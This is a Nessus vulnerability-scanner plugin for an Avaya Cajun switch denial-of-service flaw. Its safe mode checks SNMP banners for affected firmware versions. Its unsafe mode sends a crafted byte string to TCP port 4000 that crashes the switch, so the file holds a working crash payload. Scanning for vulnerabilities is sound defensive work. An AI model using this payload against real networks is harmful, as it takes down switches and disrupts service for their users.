#
# (C) Tenable Network Security, Inc.
#
# THIS SCRIPT WAS NOT TESTED, so it might false negative.
# (it's about crashing the remote appliance though).
#
# Ref:
#  Date: Wed, 18 Jun 2003 19:16:03 +0200 (CEST)
#  From: Jacek Lipkowski <sq5bpf@andra.com.pl>
#  To: bugtraq@securityfocus.com
#  Subject: Denial of service in Cajun P13x/P33x switch family firmware 3.x

include("compat.inc");


if(description)
{
 script_id(11759);
 script_version ("$Revision: 1.12 $");

 script_bugtraq_id(7961);
 script_osvdb_id(2178);
 script_xref(name:"Secunia", value:"9075");
 
 script_name(english:"Cajun Switch Negative Integer Handling Remote DoS");
 script_summary(english:"Crashes a Cajun switch");
 
  script_set_attribute(
   attribute:"synopsis",
   value:"The remote switch has a denial of service vulnerability."
 );
 script_set_attribute( attribute:"description",  value:
"The remote host appears to be a Avaya Cajun switch.  It was possible
to crash it by sending a malformed string to TCP port 4000.  These
attacks disable the switch for thirty seconds.

A remote attacker could use this to repeatedly disable the switch,
affecting network availability." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2003/Jun/0145.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Contact Avaya for a patch."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/06/18");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/06/18");
 script_cvs_date("$Date: 2011/03/11 21:52:31 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_family(english:"Denial of Service");
 
 script_copyright(english:"This script is Copyright (C) 2003-2011 Tenable Network Security, Inc.");
 script_dependencie("snmp_sysDesc.nasl");
 script_require_ports(4000);
 exit(0);
}

#
# The script code starts here
#

if( safe_checks())
{

  banner = get_kb_item("SNMP/sysDesc");
  if( ! banner ) exit(0);

  if ("Avaya P130" >< banner )
  {
   if(egrep(pattern:"Avaya.*P130.*version .*",
     	    string:banner))security_hole(4000);

  }
  else if ("Avaya" >< banner && "P33" >< banner)
  {
   if(egrep(pattern:"Avaya.*P33[03].*version [0-3]\.", string:banner))
     	security_hole(4000);
  }
  exit(0);
}


port = 4000;
if(!get_port_state(port))exit(0);

start_denial();

soc = open_sock_tcp(4000);
if(!soc)exit(0);

send(socket:soc, data:raw_string(0x80) + "dupa");
close(soc);

alive = end_denial();					     
if(!alive){
  		security_hole(4000);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
